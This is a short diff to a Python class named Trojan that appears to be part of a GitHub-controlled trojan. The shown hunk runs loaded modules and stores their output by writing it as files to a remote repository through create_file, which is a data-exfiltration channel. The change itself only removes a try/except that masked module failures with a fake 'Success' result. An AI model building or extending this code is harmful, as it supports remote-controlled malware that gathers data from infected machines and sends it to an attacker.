@@ -80,13 +80,10 @@ class Trojan:
             data_path = f'{self.data_dir}{module}/{formatted_date}.data'
             data_bytes = bytes('%r' % data, 'utf-8')
             self.repo.create_file(path=data_path, message=formatted_date, content=data_bytes)
-        try:
-            if flag_protected:
-                data = sys.modules[module].run('--protected')
-            else:
-                data = sys.modules[module].run()
-        except Exception:
-            data = "Success"
+        if flag_protected:
+            data = sys.modules[module].run('--protected')
+        else:
+            data = sys.modules[module].run()
         store_data(data)
 
 
